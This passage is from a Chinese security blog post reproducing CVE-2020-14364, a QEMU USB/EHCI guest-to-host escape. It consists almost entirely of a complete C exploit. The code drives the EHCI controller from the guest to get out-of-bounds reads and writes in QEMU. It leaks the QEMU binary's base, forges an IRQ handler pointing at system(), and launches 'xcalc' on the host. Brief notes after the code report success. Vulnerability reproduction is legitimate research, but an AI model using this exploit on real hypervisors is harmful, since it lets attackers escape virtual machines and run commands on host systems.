class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> * <span class="hljs-title">qh</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> * <span class="hljs-title">qtd</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ohci_td</span> * <span class="hljs-title">td</span>;</span><br><span class="hljs-type">char</span> *dmabuf;<br><span class="hljs-type">char</span> *setup_buf;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *mmio_mem;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data_buf;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data_buf_oob;<br><span class="hljs-type">uint32_t</span> *entry;<br><span class="hljs-type">uint64_t</span> dev_addr;<br><span class="hljs-type">uint64_t</span> data_buf_addr;<br><span class="hljs-type">uint64_t</span> USBPort_addr; <br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PRESET       (1 &lt;&lt; 8)     <span class="hljs-comment">// Port Reset</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PED          (1 &lt;&lt; 2)     <span class="hljs-comment">// Port Enable/Disable</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_RUNSTOP      (1 &lt;&lt; 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_PSE          (1 &lt;&lt; 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_OUT         0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_IN          0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_ACTIVE    (1 &lt;&lt; 7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_SETUP     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_IN        1 <span class="hljs-comment">/* device -&gt; host */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_OUT       0 <span class="hljs-comment">/* host -&gt; device */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_TBYTES_SH 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_PID_SH    8</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span> <span class="hljs-title">USBDevice</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBEndpoint</span> <span class="hljs-title">USBEndpoint</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBEndpoint</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span> nr;<br>    <span class="hljs-type">uint8_t</span> pid;<br>    <span class="hljs-type">uint8_t</span> type;<br>    <span class="hljs-type">uint8_t</span> ifnum;<br>    <span class="hljs-type">int</span> max_packet_size;<br>    <span class="hljs-type">int</span> max_streams;<br>    <span class="hljs-type">bool</span> pipeline;<br>    <span class="hljs-type">bool</span> halted;<br>    USBDevice *dev;<br>    USBEndpoint *fd;<br>    USBEndpoint *bk;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span> &#123;</span><br>    <span class="hljs-type">int32_t</span> remote_wakeup;<br>    <span class="hljs-type">int32_t</span> setup_state;<br>    <span class="hljs-type">int32_t</span> setup_len;<br>    <span class="hljs-type">int32_t</span> setup_index;<br><br>    USBEndpoint ep_ctl;<br>    USBEndpoint ep_in[<span class="hljs-number">15</span>];<br>    USBEndpoint ep_out[<span class="hljs-number">15</span>];<br>&#125;;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br><br>    <span class="hljs-comment">/* endpoint characteristics */</span><br>    <span class="hljs-type">uint32_t</span> epchar;<br><br>    <span class="hljs-comment">/* endpoint capabilities */</span><br>    <span class="hljs-type">uint32_t</span> epcap;<br><br>    <span class="hljs-type">uint32_t</span> current_qtd;             <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> next_qtd;                <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext_qtd;<br><br>    <span class="hljs-type">uint32_t</span> token;                   <span class="hljs-comment">/* Same as QTD token */</span><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqh;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext;                 <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> token;<br><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqtd;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">virt2phys</span><span class="hljs-params">(<span class="hljs-type">void</span>* p)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> virt = (<span class="hljs-type">uint64_t</span>)p;<br><br>    <span class="hljs-comment">// Assert page alignment</span><br><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>)<br>        die(<span class="hljs-string">&quot;open&quot;</span>);<br>    <span class="hljs-type">uint64_t</span> offset = (virt / <span class="hljs-number">0x1000</span>) * <span class="hljs-number">8</span>;<br>    lseek(fd, offset, SEEK_SET);<br><br>    <span class="hljs-type">uint64_t</span> phys;<br>    <span class="hljs-keyword">if</span> (read(fd, &amp;phys, <span class="hljs-number">8</span> ) != <span class="hljs-number">8</span>)<br>        die(<span class="hljs-string">&quot;read&quot;</span>);<br>    <span class="hljs-comment">// Assert page present</span><br><br>    phys = (phys &amp; ((<span class="hljs-number">1ULL</span> &lt;&lt; <span class="hljs-number">54</span>) - <span class="hljs-number">1</span>)) * <span class="hljs-number">0x1000</span>+(virt&amp;<span class="hljs-number">0xfff</span>);<br><br>    close(fd);<br>    <span class="hljs-keyword">return</span> phys;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">die</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* msg)</span><br>&#123;<br>    perror(msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    *((<span class="hljs-type">uint32_t</span>*)(mmio_mem + addr)) = value;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *((<span class="hljs-type">uint64_t</span>*)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br><br>    <span class="hljs-type">int</span> mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:1d.7/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    <span class="hljs-keyword">if</span> (mmio_fd == <span class="hljs-number">-1</span>)<br>        die(<span class="hljs-string">&quot;mmio_fd open failed&quot;</span>);<br><br>    mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_mem == MAP_FAILED)<br>        die(<span class="hljs-string">&quot;mmap mmio_mem failed&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mmio_mem: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)mmio_mem);<br>    <br><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; ++i)<br>    &#123;<br>        dmabuf = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x3000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (dmabuf == MAP_FAILED)<br>            die(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        *(<span class="hljs-type">char</span> *)dmabuf = <span class="hljs-string">&#x27;a&#x27;</span>;<br>        *(<span class="hljs-type">char</span> *)(dmabuf + <span class="hljs-number">0x1000</span>) = <span class="hljs-string">&#x27;b&#x27;</span>;<br>        *(<span class="hljs-type">char</span> *)(dmabuf + <span class="hljs-number">0x2000</span>) = <span class="hljs-string">&#x27;c&#x27;</span>;<br>    <br>        entry = dmabuf + <span class="hljs-number">4</span>;<br>        qh = dmabuf + <span class="hljs-number">0x100</span>;<br>        qtd = dmabuf + <span class="hljs-number">0x200</span>;<br>        setup_buf = dmabuf + <span class="hljs-number">0x300</span>;<br>        data_buf = dmabuf + <span class="hljs-number">0x1000</span>;<br>        data_buf_oob = dmabuf + <span class="hljs-number">0x2000</span>;<br><br>        <span class="hljs-comment">// printf(&quot;phy_data_buf: 0x%lx\t phy_data_buf_oob: 0x%lx\n&quot;, virt2phys(data_buf), virt2phys(data_buf_oob));</span><br><br>        <span class="hljs-keyword">if</span>(virt2phys(data_buf) + <span class="hljs-number">0x1000</span> == virt2phys(data_buf_oob))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dmabuf: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)dmabuf);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;phy_dmabuf: 0x%lx\n&quot;</span>, virt2phys(dmabuf));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)data_buf);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;phy_data_buf: 0x%lx\n&quot;</span>, virt2phys(data_buf));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf_oob: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)data_buf_oob);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;phy_data_buf_oob: 0x%lx\n&quot;</span>, virt2phys(data_buf_oob));<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(i == <span class="hljs-number">0x1000</span>)<br>    &#123;<br>        die(<span class="hljs-string">&quot;Unable to find a contiguous physical address!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;init Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">reset_enable_port</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_EHCIState</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x2C</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">// frindex</span><br>    mmio_write(<span class="hljs-number">0x34</span>, virt2phys(dmabuf));    <span class="hljs-comment">// periodiclistbase</span><br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);      <span class="hljs-comment">// usbcmd</span><br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_qh</span><span class="hljs-params">()</span>&#123;<br>    qh-&gt;epchar = <span class="hljs-number">0x00</span>;<br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = virt2phys(qtd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_state</span><span class="hljs-params">()</span>&#123;<br>    reset_enable_port();<br>    set_qh();<br><br>    setup_buf[<span class="hljs-number">6</span>] = <span class="hljs-number">0xff</span>;<br>    setup_buf[<span class="hljs-number">7</span>] = <span class="hljs-number">0x0</span>;<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">8</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(setup_buf);<br><br>    *entry = virt2phys(qh)+<span class="hljs-number">0x2</span>;<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;init_state Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_length</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> len,<span class="hljs-type">uint8_t</span> option)</span>&#123;<br><br>    reset_enable_port();<br><br>    set_qh();<br><br>    setup_buf[<span class="hljs-number">0</span>] = option;<br>    setup_buf[<span class="hljs-number">6</span>] = len &amp; <span class="hljs-number">0xff</span>;<br>    setup_buf[<span class="hljs-number">7</span>] = (len &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xff</span>;<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">8</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(setup_buf);<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;set_length Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_copy_read</span><span class="hljs-params">()</span>&#123;<br><br>    reset_enable_port();<br>    set_qh();<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_IN &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x1e00</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = virt2phys(data_buf_oob);<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do_copy_read Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_copy_write</span><span class="hljs-params">(<span class="hljs-type">int</span> offset, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> setup_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> setup_index)</span>&#123;<br><br>    reset_enable_port();<br>    set_qh();<br><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf_oob + offset) = <span class="hljs-number">0x0000000200000002</span>; <span class="hljs-comment">// 覆盖成原先的内容</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(data_buf_oob + <span class="hljs-number">0x8</span> +offset) = setup_len; <span class="hljs-comment">//setup_len</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(data_buf_oob + <span class="hljs-number">0xc</span>+ offset) = setup_index;<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_OUT &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x1e00</span> &lt;&lt; QTD_TOKEN_TBYTES_SH; <span class="hljs-comment">// flag</span><br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = virt2phys(data_buf_oob);<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do_copy_write Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_state_data</span><span class="hljs-params">()</span><br>&#123;<br>    set_length(<span class="hljs-number">0x500</span>, USB_DIR_OUT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> target_addr, <span class="hljs-type">uint64_t</span> payload)</span><br>&#123;<br>    setup_state_data();<br><br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset = target_addr - data_buf_addr;<br>    do_copy_write(<span class="hljs-number">0</span>, offset+<span class="hljs-number">0x8</span>, offset<span class="hljs-number">-0x1010</span>);<br><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf) = payload;<br>    do_copy_write(<span class="hljs-number">0</span>, <span class="hljs-number">0xffff</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;arb_write Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">arb_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> target_addr)</span><br>&#123;<br>    setup_state_data();<br><br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br><br>    do_copy_write(<span class="hljs-number">0</span>, <span class="hljs-number">0x1010</span>, <span class="hljs-number">0xfffffff8</span><span class="hljs-number">-0x1010</span>);<br><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf) = <span class="hljs-number">0x2000000000000080</span>; <span class="hljs-comment">// set setup[0] -&gt; USB_DIR_IN</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> target_offset = target_addr - data_buf_addr;<br><br>    do_copy_write(<span class="hljs-number">0x8</span>, <span class="hljs-number">0xffff</span>, target_offset - <span class="hljs-number">0x1018</span>);<br>    do_copy_read(); <span class="hljs-comment">// oob read</span><br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;arb_read Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">debug</span><span class="hljs-params">()</span><br>&#123;<br>    getchar();<br>    getchar();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    init();<br><br>    iopl(<span class="hljs-number">3</span>);<br>    outw(<span class="hljs-number">0</span>,<span class="hljs-number">0xc080</span>);<br>    outw(<span class="hljs-number">0</span>,<span class="hljs-number">0xc0a0</span>);<br>    outw(<span class="hljs-number">0</span>,<span class="hljs-number">0xc0c0</span>);<br>    sleep(<span class="hljs-number">3</span>);<br><br>    <span class="hljs-comment">// debug();</span><br><br>    init_state();<br>    set_length(<span class="hljs-number">0x200</span>, USB_DIR_IN);  <span class="hljs-comment">// s-&gt;setup_state = SETUP_STATE_DATA;</span><br>    set_length(<span class="hljs-number">0x2000</span>, USB_DIR_IN);<br>    do_copy_read(); <span class="hljs-comment">// oob read</span><br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf[%d]: %lx\n&quot;</span>, i, *(<span class="hljs-type">uint64_t</span> *)(data_buf + i * <span class="hljs-number">8</span>));<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--------------------------------------------\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf_oob[%d]: %lx\n&quot;</span>, i, *(<span class="hljs-type">uint64_t</span> *)(data_buf_oob + i * <span class="hljs-number">8</span>));<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span>* <span class="hljs-title">usb_device_tmp</span> =</span> data_buf_oob + <span class="hljs-number">0x4</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span> <span class="hljs-title">usb_device</span>;</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;usb_device, usb_device_tmp, <span class="hljs-keyword">sizeof</span>(USBDevice));<br><br>    dev_addr = usb_device.ep_ctl.dev;<br>    data_buf_addr = dev_addr + <span class="hljs-number">0xdc</span>;<br>    USBPort_addr = dev_addr + <span class="hljs-number">0x78</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USBDevice dev_addr: 0x%llx\n&quot;</span>, dev_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USBDevice-&gt;data_buf: 0x%llx\n&quot;</span>, data_buf_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USBPort_addr: 0x%llx\n&quot;</span>, USBPort_addr);<br><br>    <span class="hljs-type">uint64_t</span> *tmp=data_buf_oob+<span class="hljs-number">0x4fc</span>;   <span class="hljs-comment">// desc_device_high</span><br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> leak_addr = *tmp;<br>    <span class="hljs-keyword">if</span>(leak_addr == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INIT DOWN,DO IT AGAIN\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Raw Leaked Address: 0x%llx\n&quot;</span>, leak_addr);<br><br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> base = leak_addr - <span class="hljs-number">0x1098150</span>;<br>    <span class="hljs-type">uint64_t</span> system_plt = base + <span class="hljs-number">0x2c15d4</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak elf_base address : 0x%llx!\n&quot;</span>, base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak system_plt address: 0x%llx!\n&quot;</span>, system_plt);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> USBPort_ptr = arb_read(USBPort_addr);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> EHCIState_addr = USBPort_ptr - <span class="hljs-number">0x540</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> irq_addr = EHCIState_addr + <span class="hljs-number">0xc0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> fake_irq_addr = data_buf_addr; <span class="hljs-comment">//dev_addr + 0xdc;   </span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> irq_ptr = arb_read(irq_addr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EHCIState_addr: 0x%llx\n&quot;</span>, EHCIState_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USBPort_ptr: 0x%llx\n&quot;</span>, USBPort_ptr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;irq_addr: 0x%llx\n&quot;</span>, irq_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake_irq_addr: 0x%llx\n&quot;</span>, fake_irq_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;irq_ptr: 0x%llx\n&quot;</span>, irq_ptr);<br><br>    <span class="hljs-comment">// construct fake_irq</span><br>    setup_state_data();<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf + <span class="hljs-number">0x28</span>) = system_plt; <span class="hljs-comment">// handler</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf + <span class="hljs-number">0x30</span>) = dev_addr+<span class="hljs-number">0xdc</span>+<span class="hljs-number">0x100</span>; <span class="hljs-comment">//opaque</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf + <span class="hljs-number">0x38</span>) = <span class="hljs-number">0x3</span>; <span class="hljs-comment">//n</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf + <span class="hljs-number">0x100</span>) = <span class="hljs-number">0x636c616378</span>; <span class="hljs-comment">// &quot;xcalc; exit&quot;</span><br>    do_copy_write(<span class="hljs-number">0</span>, <span class="hljs-number">0xffff</span>, <span class="hljs-number">0xffff</span>);<br><br>    debug();<br><br>    <span class="hljs-comment">// write fake_irq</span><br>    arb_write(irq_addr, fake_irq_addr);<br><br>    <span class="hljs-comment">// // write back  irq_ptr</span><br>    <span class="hljs-comment">// arb_write(irq_addr, irq_ptr);</span><br><br>    <span class="hljs-comment">//printf(&quot;success233!\n&quot;);</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>
<p>漏洞利用成功但是并未弹出计算器，qemu报错：</p>
<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251215155240427.png" srcset="/img/loading.gif" lazyload alt="image-20251215155240427"></p>
<p>这里可以看出程序执行了system函数，但是计算器执行失败，可能是由于没有图形化界面的原因，但是也说明漏洞利用成功了。我们在图形化界面再尝试一下，注意重启qemu后要重新获取qemu的基地址。</p>
<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251215170014159.png" srcset="/img/loading.gif" lazyload alt="image-20251215170014159"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2020-14364-Qemu逃逸漏洞复现</div>
      <div>http://yzsandw.com/2025/12/04/CVE-2020-14364-Qemu逃逸漏洞复现/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>5Y2z</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年12月4日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/12/23/TSB-agent%E5%88%86%E6%9E%90/" title="TSB-agent分析">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">TSB-agent分析</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/11/13/linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/" title="linux内核学习">
                        <span class="hidden-mobile">linux内核学习</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
